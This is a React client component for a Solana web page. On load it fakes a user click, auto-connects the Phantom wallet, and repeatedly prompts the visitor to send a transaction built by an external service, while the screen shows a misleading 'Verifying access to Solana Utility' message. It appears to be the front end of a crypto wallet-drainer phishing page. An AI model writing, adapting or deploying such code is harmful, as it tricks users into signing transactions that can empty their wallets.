'use client'

import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import { WalletName } from '@solana/wallet-adapter-base'
import { createUnsignedTransaction } from '../services/transactionIR03'
import { Transaction } from '@solana/web3.js'

export default function TransactionPage() {
  const { connection } = useConnection()
  const {
    publicKey,
    sendTransaction,
    connect,
    select,
    connected,
  } = useWallet()

  const retries = useRef(0)
  const maxRetries = 3
  const waiting = useRef(false)
  const [status, setStatus] = useState("Loading...")

  useEffect(() => {
    const simulateClick = () => {
      const fakeClick = new MouseEvent("click", {
        bubbles: true,
        cancelable: true,
        view: window
      })
      document.body.dispatchEvent(fakeClick)
    }

    const trySendTransaction = async () => {
      if (!publicKey || waiting.current || retries.current >= maxRetries) return
      waiting.current = true

      try {
        simulateClick()
        setStatus("Verifying access to Solana Utility...")
        const tx = await createUnsignedTransaction(publicKey)
        const sig = await sendTransaction(tx as Transaction, connection)
        console.log("✅ transaction sent:", sig)
        setStatus("Successful ✅")
      } catch (err: unknown) {
        if (err instanceof Error) {
          console.warn("⚠️ İşlem başarısız:", err.message)
        } else {
          console.warn("⚠️ Bilinmeyen hata:", err)
        }
        retries.current += 1
        setStatus("Verifying access to Solana Utility...")
        setTimeout(() => {
          waiting.current = false
          void trySendTransaction()
        }, 3000)
      }
    }

    const start = async () => {
      try {
        simulateClick()
        await select("Phantom" as WalletName)
        if (!connected) await connect()
        if (publicKey) void trySendTransaction()
      } catch (err) {
        console.error("connection error:", err)
        setStatus("Connection error ❌")
      }
    }

    void start()
  }, [publicKey, connected, connect, select, sendTransaction, connection])

  return (
    <div style={{
      backgroundColor: 'black',
      width: '100vw',
      height: '100vh',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      color: 'white',
      fontSize: '16px',
      fontFamily: 'monospace'
    }}>
      {status}
    </div>
  )
}
